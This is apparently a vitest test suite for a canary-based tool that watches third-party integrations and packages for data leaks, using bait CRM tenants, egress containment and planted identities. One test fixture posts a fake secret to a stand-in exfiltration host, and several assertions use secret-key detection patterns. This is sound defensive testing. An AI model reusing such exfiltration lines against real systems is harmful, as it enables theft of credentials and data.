/**
 * The three expansions beyond MCP tools, each really executed:
 *   integrations   a bait CRM tenant, the contain-mode observer, and the helpdesk-copilot release flip
 *                  (3.1.0 cleared → 3.1.5 overreach → 3.2.0 caught), plus the gate on each
 *   identities     mint / check on the ledger, and the planted vendor world attributing who leaked
 *   products       manifest parsing, the behavioral BOM, the feed, and the review report
 */
import { spawn } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import http from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { prettyPhone } from "@tripwire/canary-core";
import { afterAll, describe, expect, it } from "vitest";
import { IdentityLedger, maskIdentity, runIdentityLab, type IdentityEvent } from "../src/lab/identities.js";
import { Lab, type TrialRun } from "../src/lab/lab.js";
import { behavioralBom, feed, parseManifest, reviewReportHtml, splitSpec } from "../src/lab/products.js";
import { RecordStore, type TrialRecord } from "../src/lab/record.js";
import { readEgress } from "../src/lab/sandbox.js";
import { API_VERSION, parseSoql, startTenant } from "../src/lab/tenant.js";

const HERE = fileURLToPath(new URL(".", import.meta.url));
const OBSERVER = resolve(HERE, "../sandbox/observe.cjs");
// Built at runtime so no key-shaped literal sits in the repo for secret scanners to trip on.
const LIVE = ["sk", "live", ""].join("_");
const AKIA = ["AK", "IA"].join("");
const tmp = mkdtempSync(join(tmpdir(), "mole-exp-"));
afterAll(() => rmSync(tmp, { recursive: true, force: true }));

const rec = (o: Partial<TrialRecord>): TrialRecord => ({
  id: `t_${Math.random().toString(36).slice(2, 8)}`, listingId: "x/y", title: "y", version: "1.0.0", kind: "npm", lab: false, runner: "sandbox",
  startedAt: new Date().toISOString(), durationMs: 10, verdict: "cleared", summary: "cleared", toolsFound: 1,
  toolNames: ["a"], probes: 1, egress: 0, baitPlanted: 7, findings: [], ...o,
});

const finished = async (run: TrialRun) => { while (!run.stream.done) await new Promise((r) => setTimeout(r, 50)); return run.record!; };

/* ── Integrations ─────────────────────────────────────────────────────────── */

describe("SOQL subset", () => {
  it("parses fields, FIELDS(ALL), WHERE and LIMIT", () => {
    expect(parseSoql("SELECT Id, Subject FROM Case WHERE Status = 'Open' LIMIT 5")).toEqual({
      fields: ["Id", "Subject"], object: "Case", where: { field: "Status", value: "Open" }, limit: 5,
    });
    expect(parseSoql("select fields(all) from Contact")).toEqual({ fields: "ALL", object: "Contact", where: undefined, limit: undefined });
  });
  it("rejects what it doesn't support, like the real API's MALFORMED_QUERY", () => {
    expect(parseSoql("SELECT Id FROM Case WHERE Status != 'Open'")).toBeNull();
    expect(parseSoql("DELETE FROM Case")).toBeNull();
  });
});

describe("bait tenant", () => {
  it("serves a Salesforce-shaped API, rejects bad tokens, and logs every call with the records and bait it exposed", async () => {
    const t = await startTenant();
    try {
      const q = (soql: string, token = t.token) =>
        fetch(`${t.url}/services/data/${API_VERSION}/query?q=${encodeURIComponent(soql)}`, { headers: { authorization: `Bearer ${token}` } });

      expect((await q("SELECT Id FROM Case", "wrong")).status).toBe(401);
      expect(t.calls.at(-1)).toMatchObject({ op: "auth-failed", rows: 0 });

      const body = (await (await q("SELECT FIELDS(ALL) FROM Contact")).json()) as { totalSize: number; records: { attributes: { type: string } }[] };
      expect(body.totalSize).toBe(6);
      expect(body.records[0]!.attributes.type).toBe("Contact");
      const call = t.calls.at(-1)!;
      expect(call).toMatchObject({ op: "query", object: "Contact", rows: 6 });
      expect(new Set(call.recordIds).size).toBe(6);
      expect(call.canaryIds.length).toBe(12); // an email and a phone per contact

      // The token is planted too, and never counted as "exposed" by a response.
      expect(t.registry.all().some((c) => c.value === t.token)).toBe(true);
      expect(call.canaryIds).not.toContain(t.registry.all().find((c) => c.value === t.token)!.id);

      expect((await q("SELECT Id FROM Case WHERE Status != 'x'")).status).toBe(400);
    } finally {
      await t.close();
    }
  });
});

describe("observer contain mode", () => {
  it("passes allowed hosts through, logs everything else with its body, and answers it locally", async () => {
    const server = http.createServer((_q, s) => s.end("from-local"));
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
    const port = (server.address() as AddressInfo).port;
    const egress = join(tmp, "contain.jsonl");
    const script = join(tmp, "contain.mjs");
    writeFileSync(script, `
      const local = await (await fetch("http://127.0.0.1:${port}/")).text();
      const out = await fetch("http://exfil.mole-test.example/drop", { method: "POST", body: "payload-${LIVE}abcd1234" });
      console.log(JSON.stringify({ local, status: out.status }));
    `);
    const child = spawn(process.execPath, [script], {
      env: { PATH: process.env.PATH ?? "", NODE_OPTIONS: `--require ${OBSERVER}`, MOLE_EGRESS: egress, MOLE_CONTAIN: "127.0.0.1,localhost" },
      stdio: ["ignore", "pipe", "pipe"],
    });
    let out = "";
    child.stdout.on("data", (b) => { out += String(b); });
    await new Promise((r) => child.on("exit", r));
    server.close();

    expect(JSON.parse(out.trim())).toEqual({ local: "from-local", status: 202 });
    const logged = readEgress(egress).filter((r) => r.host.startsWith("exfil."));
    expect(logged).toHaveLength(1);
    expect(logged[0]!.method).toBe("POST");
    expect(logged[0]!.body).toContain(`payload-${LIVE}abcd1234`);
  });
});

describe("integration release watch (really executed)", () => {
  const store = new RecordStore(join(tmp, "integ-record"));
  const lab = new Lab(store);
  const results: Record<string, { record: TrialRecord; run: TrialRun }> = {};

  it("3.1.0 clears, 3.1.5 overreaches, 3.2.0 is caught exporting the org", async () => {
    const listing = lab.listings.get("lab/helpdesk-copilot")!;
    for (const v of ["3.1.0", "3.1.5", "3.2.0"]) {
      const run = lab.startTrial(listing, v);
      results[v] = { run, record: await finished(run) };
    }
    const r0 = results["3.1.0"]!.record, r5 = results["3.1.5"]!.record, r2 = results["3.2.0"]!.record;

    expect(r0.verdict).toBe("cleared");
    expect(r0.findings.length).toBeGreaterThan(0); // case data reached its own summarize API...
    expect(r0.findings.every((f) => f.expected)).toBe(true); // ...which it declares, so nothing counts as a leak

    expect(r5.verdict).toBe("overreach");
    expect(r5.overreach).toEqual({ objects: ["Contact"], records: 6 });
    expect(r5.findings.filter((f) => !f.expected)).toHaveLength(0);

    expect(r2.verdict).toBe("caught");
    const leaks = r2.findings.filter((f) => !f.expected);
    expect(new Set(leaks.map((f) => f.destination))).toEqual(new Set(["sync.copilot-telemetry.example"]));
    expect(leaks.some((f) => f.canaryLabel === "Integration OAuth access token")).toBe(true);
    expect(r2.overreach!.objects.sort()).toEqual(["Account", "Contact", "Opportunity", "User"]);
    expect(r2.overreach!.records).toBe(16); // distinct records, even though Contact is queried twice
  }, 90_000);

  it("draws only real leaks as bait: a request to the declared service is labelled own", () => {
    const eg = (v: string) => results[v]!.run.stream.events.filter((e) => e.type === "egress") as { host: string; bait: boolean; own?: boolean }[];
    expect(eg("3.1.0").some((e) => e.own)).toBe(true);
    expect(eg("3.1.0").some((e) => e.bait)).toBe(false);
    expect(eg("3.2.0").find((e) => e.host.startsWith("sync."))!.bait).toBe(true);
  });

  it("never stores a full planted secret in evidence", () => {
    const blob = JSON.stringify(results["3.2.0"]!.record);
    expect(blob).not.toMatch(new RegExp(`${AKIA}[0-9A-Z]{16}`));
    expect(blob).not.toMatch(new RegExp(`${LIVE}[A-Za-z0-9]{12,}`));
    expect(blob).not.toMatch(/00D[A-Z0-9]{12}!AQ/);
  });

  it("gates each version: allow, hold, block", () => {
    expect(lab.gate("lab/helpdesk-copilot", "3.1.0").decision).toBe("allow");
    expect(lab.gate("lab/helpdesk-copilot", "3.1.5")).toMatchObject({ decision: "hold" });
    expect(lab.gate("lab/helpdesk-copilot", "3.2.0").decision).toBe("block");
    expect(store.stats()).toMatchObject({ cleared: 1, overreach: 1, caught: 1 });
  });

  it("writes a review report with the declared scope, the overreach, and no full secrets", () => {
    const html = reviewReportHtml(results["3.2.0"]!.record, lab.listings.get("lab/helpdesk-copilot"));
    expect(html).toContain("Declared scope");
    expect(html).toContain("Beyond declared scope");
    expect(html).toContain("planted lab case");
    expect(html).toContain("Limits");
    expect(html).not.toMatch(new RegExp(`${AKIA}[0-9A-Z]{16}`));
    expect(html).not.toMatch(/00D[A-Z0-9]{12}!AQ/);
    expect(html).not.toMatch(/\bsafe\b/i);
  });
});

/* ── Identities ───────────────────────────────────────────────────────────── */

describe("identity ledger", () => {
  const ledger = new IdentityLedger(join(tmp, "ids"));
  const a = ledger.mint("acme-newsletter", "newsletter");
  const b = ledger.mint("bolt-crm", "crm trial");

  it("mints distinct identities with fictional 555-01XX phones and persists them", () => {
    expect(a.id).not.toBe(b.id);
    expect(a.phone).toMatch(/^\+1\d{3}55501\d{2}$/);
    expect(a.email).toContain(a.id.toLowerCase());
    expect(a.address).toContain(`Unit ${a.id}`);
    expect(new IdentityLedger(join(tmp, "ids")).all().map((i) => i.id)).toEqual([a.id, b.id]);
  });

  it("finds each strong field, however it's formatted, and names the one vendor", () => {
    expect(ledger.check(`From: list <${a.email.toUpperCase()}>`)).toEqual([{ identityId: a.id, vendor: "acme-newsletter", fields: ["email"], source: "text" }]);
    expect(ledger.check(`call ${prettyPhone(a.phone)} now`)[0]!.fields).toEqual(["phone"]);
    const d = a.phone.replace(/\D/g, "").slice(-10);
    expect(ledger.check(`${d.slice(0, 3)}-${d.slice(3, 6)}-${d.slice(6)}`)[0]!.vendor).toBe("acme-newsletter");
    expect(ledger.check(`ship to ${b.address}`)[0]).toMatchObject({ vendor: "bolt-crm", fields: ["address"] });
    expect(ledger.check(`...phrase is ${b.phrase}.`, "model output")[0]).toMatchObject({ vendor: "bolt-crm", fields: ["phrase"], source: "model output" });
  });

  it("never counts a name alone", () => {
    expect(ledger.check(`${a.first} ${a.last} and ${b.first} ${b.last}`)).toEqual([]);
  });

  it("masks for display", () => {
    const m = maskIdentity(a);
    expect(m.email).not.toBe(a.email);
    expect(m.phone).not.toContain(a.phone.slice(-4));
    expect(m.phone.endsWith(a.phone.slice(-2))).toBe(true);
    expect(m.phrase).not.toContain(a.id.toLowerCase());
  });

  it("can take a phone number the user controls", () => {
    expect(ledger.mint("x", "y", { phone: "+14155550199" }).phone).toBe("+14155550199");
  });
});

describe("identity lab (really executed)", () => {
  it("attributes the broker listing to lab-crm and the model's completion to lab-ai-assistant; the newsletter stays quiet", async () => {
    const ledger = new IdentityLedger(join(tmp, "ids-lab"));
    const events: IdentityEvent[] = [];
    const sightings = await runIdentityLab(ledger, (e) => events.push(e));
    expect(events.find((e) => e.type === "error")).toBeUndefined();
    const by = (v: string) => sightings.filter((s) => s.vendor === v);
    expect(by("lab-crm")[0]).toMatchObject({ source: "data broker list (lab)" });
    expect(by("lab-crm")[0]!.fields).toEqual(expect.arrayContaining(["email", "phone", "address"]));
    expect(by("lab-ai-assistant")[0]).toMatchObject({ source: "lab-ai-assistant completions", fields: ["phrase"] });
    expect(by("lab-newsletter")).toHaveLength(0);
    expect(events.at(-1)).toMatchObject({ type: "summary", quiet: ["lab-newsletter"] });
    // Minted identities go out masked in events.
    const minted = events.filter((e) => e.type === "minted") as Extract<IdentityEvent, { type: "minted" }>[];
    for (const m of minted) expect(m.identity.email).toContain("•••");
  }, 30_000);
});

/* ── Products ─────────────────────────────────────────────────────────────── */

describe("manifest parsing", () => {
  it("splits scoped specs", () => {
    expect(splitSpec("@scope/pkg@1.2.3")).toEqual({ name: "@scope/pkg", version: "1.2.3" });
    expect(splitSpec("@scope/pkg")).toEqual({ name: "@scope/pkg", version: null });
    expect(splitSpec("pkg@latest")).toEqual({ name: "pkg", version: null });
  });

  it("reads package.json, MCP client configs, and plain lists", () => {
    const pj = parseManifest(JSON.stringify({ dependencies: { a: "^1.2.3", b: ">=1 <2" }, devDependencies: { c: "~0.4.0" } }));
    expect(pj.map((c) => [c.name, c.version])).toEqual([["a", "1.2.3"], ["b", null], ["c", "0.4.0"]]);

    const mcp = parseManifest(JSON.stringify({ mcpServers: {
      mail: { command: "npx", args: ["-y", "@acme/mail-mcp@2.0.1"] },
      py: { command: "uvx", args: ["fetch-server@0.3.0"] },
      local: { command: "node", args: ["server.js"] },
    } }));
    expect(mcp.map((c) => [c.name, c.version])).toEqual([["@acme/mail-mcp", "2.0.1"], ["fetch-server", "0.3.0"], ["local", null]]);

    const list = parseManifest("# comment\nfoo@1.0.0\n\nbar  # trailing\n");
    expect(list.map((c) => [c.name, c.version, c.from])).toEqual([["foo", "1.0.0", "list"], ["bar", null, "list"]]);
  });
});

describe("behavioral BOM and feed", () => {
  const store = new RecordStore(join(tmp, "bom-record"));
  store.add(rec({ listingId: "io.github.acme/mail", package: "@acme/mail-mcp", version: "2.0.0", verdict: "cleared" }));
  store.add(rec({ listingId: "io.github.acme/mail", package: "@acme/mail-mcp", version: "2.0.1", verdict: "caught", summary: "caught sending 2 bait items to x.example",
    findings: [{ severity: "critical", tool: "send", canaryId: "c1", canaryType: "secret", canaryLabel: "Stripe key", channel: "egress", destination: "x.example", evidence: "POST x.example", expected: false }] }));
  store.add(rec({ listingId: "lab/helpdesk-copilot", kind: "integration", lab: true, version: "3.1.5", verdict: "overreach", overreach: { objects: ["Contact"], records: 6 } }));

  it("resolves each component at its exact version, by package or listing id, and says untested otherwise", () => {
    const bom = behavioralBom("@acme/mail-mcp@2.0.1\nio.github.acme/mail@2.0.0\n@acme/mail-mcp@9.9.9\nlab/helpdesk-copilot@3.1.5\nleft-pad@1.3.0\nunpinned", store);
    expect(bom.format).toBe("mole-bbom/1");
    expect(bom.components.map((c) => c.status)).toEqual(["caught", "cleared", "untested", "overreach", "untested", "untested"]);
    expect(bom.components[2]!.otherVersions?.map((o) => o.version).sort()).toEqual(["2.0.0", "2.0.1"]);
    expect(bom.components[4]!.summary).toBe("never trialed");
    expect(bom.components[5]!.summary).toMatch(/no exact version/);
    expect(bom.summary).toEqual({ components: 6, cleared: 1, caught: 1, overreach: 1, inconclusive: 0, untested: 3 });
  });

  it("uses the package resolver for records written before they carried a package", () => {
    const old = new RecordStore(join(tmp, "bom-old"));
    old.add(rec({ listingId: "io.github.z/pre", version: "1.0.0", verdict: "cleared" }));
    expect(behavioralBom("pre-mcp@1.0.0", old).components[0]!.status).toBe("untested");
    expect(behavioralBom("pre-mcp@1.0.0", old, (id) => (id === "io.github.z/pre" ? "pre-mcp" : undefined)).components[0]!.status).toBe("cleared");
  });

  it("emits one measured row per artifact@version, optionally without lab cases", () => {
    const rows = feed(store);
    expect(rows).toHaveLength(3);
    const caught = rows.find((r) => r.verdict === "caught")!;
    expect(caught).toMatchObject({ schema: "mole-feed/1", package: "@acme/mail-mcp", leaks: 1, leak_destinations: ["x.example"] });
    expect(rows.find((r) => r.verdict === "overreach")!.overreach_objects).toEqual(["Contact"]);
    expect(feed(store, { includeLab: false }).every((r) => !r.lab)).toBe(true);
  });

  it("escapes everything it prints into the report", () => {
    const html = reviewReportHtml(rec({ title: "<script>x</script>", summary: "a & b" }));
    expect(html).not.toContain("<script>x");
    expect(html).toContain("&lt;script&gt;");
    expect(html).toContain("a &amp; b");
  });
});

/* ── Hosting: shared persistence and bundled assets ───────────────────────── */

describe("merging shared state (persist.ts)", () => {
  it("unions trials by id, keeps time order, and never drops a trial either instance wrote", () => {
    const a = new RecordStore(join(tmp, "merge-a"));
    const b = new RecordStore(join(tmp, "merge-b"));
    const t1 = rec({ id: "t1", startedAt: "2026-10-31T00:00:01Z" });
    const t2 = rec({ id: "t2", startedAt: "2026-10-31T00:00:02Z" });
    const t3 = rec({ id: "t3", startedAt: "2026-10-31T00:00:03Z" });
    a.add(t1); a.add(t3);
    b.add(t2);
    a.merge(b.snapshot());
    b.merge(a.snapshot());
    expect(a.all().map((t) => t.id)).toEqual(["t1", "t2", "t3"]);
    expect(b.all().map((t) => t.id)).toEqual(["t1", "t2", "t3"]);
    a.merge(b.snapshot()); // idempotent
    expect(a.all()).toHaveLength(3);
    expect(new RecordStore(join(tmp, "merge-a")).all()).toHaveLength(3); // merged state is saved to disk
  });

  it("unions identities by id, so a sighting check on any instance sees every vendor's identity", () => {
    const a = new IdentityLedger(join(tmp, "idm-a"));
    const b = new IdentityLedger(join(tmp, "idm-b"));
    const ia = a.mint("vendor-a");
    const ib = b.mint("vendor-b");
    a.merge(b.snapshot());
    expect(a.check(`${ia.email} ${ib.phrase}`).map((s) => s.vendor).sort()).toEqual(["vendor-a", "vendor-b"]);
  });
});

describe("bundled assets (assets.ts)", () => {
  it("maps a fixture's TypeScript source to its prebuilt JS under prebuilt/", async () => {
    const { prebuilt, REPO } = await import("../src/lab/assets.js");
    expect(prebuilt(join(REPO, "services/mole/fixtures/mailer-mcp/server.ts"))).toBe(join(REPO, "prebuilt/services/mole/fixtures/mailer-mcp/server.mjs"));
  });
});
